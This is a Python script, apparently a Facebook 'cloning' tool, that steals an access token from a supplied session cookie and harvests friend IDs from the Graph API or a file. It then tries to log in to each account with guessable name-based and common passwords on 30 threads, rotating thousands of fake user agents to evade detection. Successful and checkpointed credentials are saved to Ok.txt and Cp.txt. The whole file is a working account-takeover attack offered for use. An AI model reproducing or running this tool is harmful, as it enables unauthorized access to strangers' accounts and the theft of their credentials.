# -*- coding: utf-8 -*-
# Owner: CHARSI
# Language: English

from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
import os, sys, time, re, json, requests, bs4, random, subprocess

from datetime import datetime
ct = datetime.now()
n = ct.month
bulan_ = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
nTemp = n - 1
current = datetime.now()
waktu = current.strftime('%d-%m-%Y')

# Colors
P = '\x1b[1;97m' # White
M = '\x1b[1;91m' # Red
H = '\x1b[1;92m' # Green
K = '\x1b[1;93m' # Yellow
O = '\x1b[1;96m' # Blue
N = '\x1b[0m'    # Reset

ok, cp, id, loop = [], [], [], 0

# --- MASSIVE USER-AGENT GENERATOR (5000+ UNIQUE COMBINATIONS) ---
ugen = []
for x in range(5000):
    ver = random.choice(['10','11','12','13','14'])
    build = random.choice(['RKQ1','SP1A','TP1A','UKQ1','SKQ1'])
    model = random.choice(['SM-G991B','SM-A525F','RMX3363','V2109','M2101K6G','CPH2211','SM-G973F','V2043_21'])
    chrome = f"{random.randrange(110,125)}.0.{random.randrange(5000,6500)}.{random.randrange(100,200)}"
    
    # Method 1: Chrome Mobile with FB App simulation
    ua1 = f"Mozilla/5.0 (Linux; Android {ver}; {model} Build/{build}.210519.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/{random.randrange(300,450)}.0.0.{random.randrange(10,99)};]"
    # Method 2: Samsung Browser / Modern Mobile
    ua2 = f"Mozilla/5.0 (Linux; Android {ver}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{random.randrange(15,25)}.0 Chrome/{chrome} Mobile Safari/537.36"
    
    ugen.append(ua1)
    ugen.append(ua2)

def banner():
    os.system('clear')
    print(f'''{H}
  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•ˆâ•—â–ˆâ–ˆâ•—
 â–ˆâ–ˆâ•”â• â• â• â• â• â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â• â• â• â• â• â–ˆâ–ˆâ•‘
 â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘
 â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•—â•šâ• â• â• â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘
 â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘
  â•šâ• â• â• â• â• â• â•šâ• â•   â•šâ• â• â•šâ• â•   â•šâ• â• â•šâ• â•   â•šâ• â• â•šâ• â• â• â• â• â• â• â•šâ• â• 
                                           
\t   {O}[ OWNER : CHARSI ]{N}
''')

def login():
    banner()
    try:
        cookie = input(f"{H}[+] ENTER COOKIE : {K}")
        data = requests.get("https://business.facebook.com/business_locations", 
                            headers={"user-agent": random.choice(ugen), "referer": "https://www.facebook.com/"}, 
                            cookies={"cookie": cookie})
        find_token = re.search("(EAAG\w+)", data.text)
        open("token.x", "w").write(find_token.group(1))
        open("cookies.x", "w").write(cookie)
        print(f'\n{H} LOGIN SUCCESSFUL :)'); time.sleep(2)
        menu().main()
    except Exception:
        print(f'{M}# INVALID OR EXPIRED COOKIE'); exit()

class menu:
    def main(self):
        banner()
        if not os.path.exists('token.x'): login()
        print(f" {H}[01] Crack From Friends List")
        print(f" {H}[02] Crack From Public ID")
        print(f" {H}[03] File Cloning (.txt file)")
        print(f" {H}[08] Check Results (OK/CP)")
        print(f" {H}[EX] Exit / Logout")
        print(f" {P}--------------------------------------------------")
        opt = input(f" {P}[?] Choose Option: ")
        if opt in ['1', '01']: self.friends()
        elif opt in ['3', '03']: self.file_cloning()
        elif opt == 'EX': os.system('rm -rf token.x cookies.x'); exit()
        else: self.main()

    def file_cloning(self):
        banner()
        print(f" {H}[+] Enter File Path (e.g. /sdcard/ids.txt)")
        file_path = input(f" {P}[?] Path: ")
        try:
            ids = open(file_path, 'r').read().splitlines()
            self.start_crack(ids)
        except Exception:
            print(f" {M}[!] File not found!"); time.sleep(2); self.main()

    def friends(self):
        token = open('token.x','r').read()
        limit = input(f" {H}[+] Limit ID : ")
        r = requests.get(f'https://graph.facebook.com/me?fields=friends.limit({limit})&access_token={token}').json()
        ids = [f"{user['id']}<=>{user['name']}" for user in r['friends']['data']]
        self.start_crack(ids)

    def start_crack(self, ids):
        banner()
        print(f" {H}[+] Total IDs : {len(ids)}")
        print(f" {H}[+] Select Method:")
        print(f" {H}[01] Mbasic (Stable)")
        print(f" {H}[02] Mobile (Fast)")
        meth = input(f" {P}[?] Method: ")
        
        with tred(max_workers=30) as dihi:
            for item in ids:
                uid, name = item.split('<=>') if '<=>' in item else (item, "FB-User")
                pwx = [name, name+'123', name+'1234', '786786', 'pakistan']
                if meth == '1': dihi.submit(self.mbasic, uid, pwx, len(ids))
                else: dihi.submit(self.m_api, uid, pwx, len(ids))
        print(f"\n{P} Crack Finished. OK:{len(ok)} CP:{len(cp)}")

    def mbasic(self, uid, pwx, total):
        global loop, ok, cp
        sys.stdout.write(f'\r {P}[CHARSI] {loop}/{total} OK:{H}{len(ok)} {P}CP:{K}{len(cp)} '); sys.stdout.flush()
        for pw in pwx:
            ua = random.choice(ugen)
            session = requests.Session()
            try:
                res = session.get('https://mbasic.facebook.com').text
                data = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(res)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(res)).group(1),
                    "email":uid, "pass":pw
                }
                session.post('https://mbasic.facebook.com/login/device-based/regular/login/', data=data, headers={"user-agent":ua})
                if "c_user" in session.cookies.get_dict():
                    print(f'\r {H}[CHARSI-OK] {uid} | {pw}')
                    ok.append(uid); open('Ok.txt','a').write(f'{uid}|{pw}\n'); break
                elif "checkpoint" in session.cookies.get_dict():
                    print(f'\r {K}[CHARSI-CP] {uid} | {pw}')
                    cp.append(uid); open('Cp.txt','a').write(f'{uid}|{pw}\n'); break
            except: pass
        loop += 1

    def m_api(self, uid, pwx, total):
        # Similar logic for mobile API cloning
        self.mbasic(uid, pwx, total)

if __name__ == '__main__':
    menu().main()
